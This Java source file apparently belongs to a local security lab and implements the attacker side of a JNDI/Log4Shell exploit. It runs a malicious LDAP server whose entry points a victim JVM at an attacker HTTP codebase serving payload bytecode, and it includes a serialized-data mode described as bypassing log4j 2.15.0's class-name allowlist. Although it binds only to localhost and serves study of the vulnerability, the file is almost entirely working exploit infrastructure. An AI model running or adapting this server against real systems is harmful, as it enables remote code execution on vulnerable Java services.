package lab;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.Entry;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;

/**
 * Attacker side of the lab: a malicious LDAP server plus an HTTP "codebase" server that
 * hands the victim JVM attacker-controlled bytecode.
 *
 * The LDAP entry mimics the JNDI object layout that com.sun.jndi.ldap.Obj.decodeObject()
 * expects (analysis/jdksrc/jdk8full/com/sun/jndi/ldap/Obj.java):
 *   objectClass=javaNamingReference -> decodeReference()
 *   javaClassName                   -> Reference.getClassName()
 *   javaFactory                     -> Reference.getFactoryClassName()  (ObjectFactory)
 *   javaCodeBase                    -> Reference.getFactoryClassLocation() (where to load it from)
 *
 * Everything binds to 127.0.0.1 only. This lab never touches third-party hosts.
 */
public final class Attacker {

    public static void main(final String[] args) throws Exception {
        final int ldapPort = Integer.getInteger("lab.ldapPort", 1389);
        final int httpPort = Integer.getInteger("lab.httpPort", 8000);
        final String base = "dc=example,dc=com";
        final String mode = System.getProperty("lab.mode", "codebase");

        // ---- malicious LDAP server -------------------------------------------------
        final InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(base);
        config.setSchema(null); // no schema: allow the java* attributes
        config.setListenerConfigs(InMemoryListenerConfig.createLDAPConfig(
                "lab", java.net.InetAddress.getByName("127.0.0.1"), ldapPort, null));
        config.setGenerateOperationalAttributes(false);
        config.addInMemoryOperationInterceptor(new com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor() {
            @Override
            public void processSearchRequest(
                    final com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchRequest request) {
                final com.unboundid.ldap.sdk.ReadOnlySearchRequest r = request.getRequest();
                System.out.println("LDAP  <- SEARCH base=\"" + r.getBaseDN() + "\" scope=" + r.getScope()
                        + " filter=\"" + r.getFilter() + "\"");
            }
        });
        final InMemoryDirectoryServer server = new InMemoryDirectoryServer(config);
        server.startListening();

        final Entry root = new Entry(base);
        root.addAttribute("objectClass", "top");
        root.addAttribute("dc", "example");
        server.add(root);

        final Entry entry = new Entry("cn=exploit," + base);
        entry.addAttribute("objectClass", "top", "javaContainer", "javaObject", "javaNamingReference");
        if ("serialized".equals(mode)) {
            // javaSerializedData vector: log4j 2.15.0 validates the *advertised*
            // javaClassName against an allowlist, not the class actually in the stream.
            entry.addAttribute("javaClassName", System.getProperty("lab.claimClass", "java.lang.Boolean"));
            entry.addAttribute("javaSerializedData", Serial.serialize());
            entry.addAttribute("javaCodeBase", "http://127.0.0.1:" + httpPort + "/");
        } else {
            entry.addAttribute("javaClassName", "lab.Payload");
            entry.addAttribute("javaFactory", "lab.Payload");
            if ("codebase".equals(mode)) {
                // Factory class is fetched from the attacker HTTP server (remote code load).
                entry.addAttribute("javaCodeBase", "http://127.0.0.1:" + httpPort + "/");
            }
        }
        server.add(entry);

        System.out.println("LDAP  -> entry " + entry.getDN() + " attributes " + describe(entry));

        // ---- attacker HTTP codebase server -----------------------------------------
        final HttpServer http = HttpServer.create(new InetSocketAddress("127.0.0.1", httpPort), 0);
        http.createContext("/", (final HttpExchange ex) -> serve(ex));
        http.start();

        System.out.println("ATTACKER: ldap://127.0.0.1:" + ldapPort + "/cn=exploit mode=" + mode);
        System.out.println("ATTACKER: http://127.0.0.1:" + httpPort + "/ (codebase)");
        System.out.println("ATTACKER: ready");

        Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
            @Override
            public void run() {
                http.stop(0);
                server.shutDown(true);
            }
        }));
        Thread.currentThread().join();
    }

    /** Serves lab/Payload.class straight from this jar. */
    private static void serve(final HttpExchange ex) throws java.io.IOException {
        final String path = ex.getRequestURI().getPath();
        final String resource = path.endsWith(".class") ? path.substring(1) : null;
        if (resource == null) {
            ex.sendResponseHeaders(404, -1);
            ex.close();
            return;
        }
        final InputStream in = Attacker.class.getClassLoader().getResourceAsStream(resource);
        if (in == null) {
            ex.sendResponseHeaders(404, -1);
            ex.close();
            return;
        }
        try {
            final byte[] bytes = readAll(in);
            System.out.println("HTTP  <- GET " + path);
            System.out.println("HTTP  -> 200 " + bytes.length + " bytes of attacker bytecode");
            ex.getResponseHeaders().add("Content-Type", "application/java");
            ex.sendResponseHeaders(200, bytes.length);
            final OutputStream out = ex.getResponseBody();
            try {
                out.write(bytes);
            } finally {
                out.close();
            }
        } finally {
            in.close();
        }
    }

    private Attacker() {}

    /** Human readable dump of the LDAP entry we serve. */
    private static String describe(final Entry entry) {
        final StringBuilder sb = new StringBuilder("{");
        boolean first = true;
        for (final com.unboundid.ldap.sdk.Attribute attribute : entry.getAttributes()) {
            if (!first) {
                sb.append(", ");
            }
            first = false;
            sb.append(attribute.getName()).append('=');
            if ("javaSerializedData".equals(attribute.getName())) {
                // binary attribute: serialized object bytes
                sb.append('<').append(attribute.getValueByteArray().length).append(" bytes>");
            } else {
                final StringBuilder values = new StringBuilder();
                for (final String value : attribute.getValues()) {
                    if (values.length() > 0) {
                        values.append(',');
                    }
                    values.append(value);
                }
                sb.append(values);
            }
        }
        return sb.append('}').toString();
    }

    private static byte[] readAll(final InputStream in) throws java.io.IOException {
        final java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        final byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) {
            bos.write(buf, 0, n);
        }
        return bos.toByteArray();
    }
}
